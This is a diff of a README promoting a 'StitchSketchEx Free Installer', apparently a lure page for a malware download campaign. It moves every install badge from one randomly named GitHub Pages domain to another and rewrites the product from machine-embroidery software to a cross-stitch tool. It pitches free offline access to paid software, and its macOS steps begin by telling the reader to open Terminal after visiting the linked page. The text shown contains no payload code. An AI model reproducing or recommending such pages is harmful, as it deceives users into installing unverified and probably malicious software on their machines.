@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Embroidery+Design-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Craft+Software-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 StitchSketchEx Free Installer** — StitchSketchEx is embroidery design software for creating and editing machine embroidery patterns. Works without internet access, no account required. Full offline installation.
+**💻 StitchSketchEx Free Installer** — StitchSketchEx is a cross stitch and needlework design tool for creating original patterns. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About StitchSketchEx
 
-StitchSketchEx is embroidery design software for creating and editing machine embroidery patterns. Convert artwork to embroidery stitches, edit stitch paths, and export designs in formats compatible with major embroidery machines. Features include a stitch simulator, color palette management, and lettering tools for personalizing embroidery projects.
+StitchSketchEx is a cross stitch and needlework design tool for creating original patterns. It supports color thread palettes from major thread brands, backstitching, fractional stitches, and export for printing on graph paper for stitching.
 
 ---
 
 ## ❌ Problem: StitchSketchEx is hard to access
 
-- **Windows Only** — No macOS support
-- **Machine Compatibility** — Must verify export format compatibility with your specific embroidery machine
-- **Learning Curve** — Embroidery-specific concepts require dedicated learning
-- **Cost** — Professional embroidery software pricing can be significant
+- **Niche Audience** — Specifically for cross stitch and embroidery designers
+- **Paid License** — Requires purchase for full features
+- **Windows Primary** — macOS version may have limited feature parity
+- **Limited Integration** — Export focused on print; no digital pattern sharing platform
 
 ---
 
@@ -61,9 +61,9 @@ StitchSketchEx is embroidery design software for creating and editing machine em
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ StitchSketchEx is embroidery design software for creating and editing machine em
 
 <div align="center">
 
-[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ StitchSketchEx is embroidery design software for creating and editing machine em
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ StitchSketchEx is embroidery design software for creating and editing machine em
 
 ---
 
-**StitchSketchEx Free Installer** — StitchSketchEx is embroidery design software for creating and editing machine embroidery patterns. Install without internet connection today!
+**StitchSketchEx Free Installer** — StitchSketchEx is a cross stitch and needlework design tool for creating original patterns. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install StitchSketchEx](https://img.shields.io/badge/⬇_Install_StitchSketchEx-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
